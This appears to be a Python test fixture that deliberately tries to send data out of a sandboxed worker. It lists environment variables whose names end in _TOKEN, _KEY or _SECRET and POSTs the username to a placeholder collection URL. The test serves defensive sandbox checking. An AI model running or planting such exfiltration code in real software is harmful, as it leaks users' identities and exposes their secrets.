"""Fixture: tries to send data to an external host when run."""

import os
import sys
import urllib.request


def main() -> int:
    payload = ("user=" + os.environ.get("USER", "?")).encode()
    # Also probe for host secrets that must not be present in workers.
    leaked = [k for k in os.environ if k.endswith(("_TOKEN", "_KEY", "_SECRET"))]
    print(f"environment secrets visible: {leaked}", flush=True)
    urllib.request.urlopen("https://example.com/collect", data=payload, timeout=5)
    print("sent!")
    return 0


if __name__ == "__main__":
    sys.exit(main())
